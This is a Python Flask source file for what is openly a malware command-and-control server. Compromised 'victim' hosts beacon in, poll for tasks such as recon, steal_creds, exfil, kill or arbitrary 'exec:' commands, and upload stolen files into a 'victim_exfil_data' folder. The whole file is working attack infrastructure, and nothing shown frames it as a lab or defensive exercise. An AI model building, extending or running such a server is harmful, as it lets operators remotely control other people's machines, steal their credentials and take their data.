from flask import Flask, request, jsonify
import json
import os
import datetime

app = Flask(__name__)

victims = {}
current_task = "sleep"

BEACONS_LOG = "beacons.log"
VICTIM_LOG = "victim.log"
UPLOAD_DIR = "victim_exfil_data"

# Ensure upload directory exists
if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR)

def log_to_file(filename, entry):
    with open(filename, "a") as f:
        f.write(json.dumps(entry) + "\n")

def log_victim_action(route, victim_id, data):
    entry = {
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "route": route,
        "victim": victim_id,
        "data": data
    }
    log_to_file(VICTIM_LOG, entry)

def log_beacon(victim_id, data):
    entry = {"victim": victim_id, "data": data}
    log_to_file(BEACONS_LOG, entry)

@app.route('/beacon', methods=['POST'])
def beacon():
    data = request.get_json()
    victim_id = data.get("hostname", "unknown")
    victims[victim_id] = data
    log_beacon(victim_id, data)
    log_victim_action("/beacon", victim_id, data)
    print(f"[+] Beacon received from {victim_id}")
    print(data)
    return jsonify({"status": "ack"}), 200

@app.route('/task', methods=['GET'])
def get_task():
    global current_task
    victim_id = request.headers.get("X-Victim-Id", "unknown")
    log_victim_action("/task", victim_id, {"task_sent": current_task})
    print(f"[+] Task requested, sending task: {current_task}")
    return current_task, 200

@app.route('/upload', methods=['POST'])
def upload():
    victim_id = request.headers.get("X-Victim-Id", "unknown")
    file = request.files.get('file')
    if file:
        filename = file.filename
        file_path = os.path.join(UPLOAD_DIR, f"{victim_id}_{filename}")
        file.save(file_path)  # Save file to victim_exfil_data directory
        log_victim_action("/upload", victim_id, {"saved_file": file_path})
        print(f"[+] Received file upload: {filename} from victim: {victim_id} saved to {file_path}")
        return jsonify({"status": "file received"}), 200
    return jsonify({"error": "no file"}), 400

@app.route('/set_task/<task>', methods=['GET'])
def set_task(task):
    global current_task
    valid_tasks = ["sleep", "recon", "steal_creds", "exfil", "kill"]
    if task in valid_tasks or task.startswith("exec:"):
        current_task = task
        print(f"[+] Task set to: {task}")
        return jsonify({"status": f"task set to {task}"}), 200
    return jsonify({"error": "invalid task"}), 400

if __name__ == '__main__':
    # Ensure log files exist or create empty
    for log_file in [BEACONS_LOG, VICTIM_LOG]:
        if not os.path.exists(log_file):
            open(log_file, 'w').close()
    app.run(host='0.0.0.0', port=8080, debug=True)

